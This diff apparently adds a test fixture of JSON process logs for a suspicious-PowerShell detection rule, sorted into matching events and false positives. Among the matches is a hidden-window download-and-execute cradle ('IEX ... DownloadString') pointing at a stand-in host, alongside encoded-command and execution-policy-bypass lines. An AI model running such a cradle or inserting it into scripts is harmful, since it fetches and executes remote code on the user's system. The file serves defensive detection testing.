@@ -1,0 +1,10 @@
+# Suspicious PowerShell logs (matches)
+{"process_name":"powershell.exe","command_line":"powershell.exe -EncodedCommand JABzAGgAdQBiAGwAaQAi","parent_process_name":"explorer.exe","timestamp":"2025-11-29T09:20:00Z","user":"svc_security"}
+{"process_name":"powershell.exe","command_line":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand QG5vbgBz","parent_process_name":"taskeng.exe","timestamp":"2025-11-29T09:21:07Z","user":"svc_security"}
+{"process_name":"powershell.exe","command_line":"powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malware.test/ps.ps1')\"","parent_process_name":"wscript.exe","timestamp":"2025-11-29T09:22:55Z","user":"svc_security"}
+{"process_name":"powershell.exe","command_line":"powershell.exe -EncodedCommand QGxvY2F0ZQ==","parent_process_name":"cmd.exe","timestamp":"2025-11-29T09:23:10Z","user":"svc_security"}
+
+# Suspicious PowerShell logs (false positives)
+{"process_name":"powershell.exe","command_line":"powershell.exe -EncodedCommand QQBlAGMAaABv","parent_process_name":"automation_host.exe","timestamp":"2025-11-29T09:30:00Z","user":"build_agent","note":"internal deployment script"}
+{"process_name":"powershell.exe","command_line":"powershell.exe -File C:\\scripts\\monitoring.ps1","parent_process_name":"scheduled_task.exe","timestamp":"2025-11-29T09:35:15Z","user":"uat_runner","note":"encoded string only used within script"}
+{"process_name":"powershell.exe","command_line":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\scripts\\deploy.ps1","parent_process_name":"devops_tool.exe","timestamp":"2025-11-29T09:36:30Z","user":"devops"}
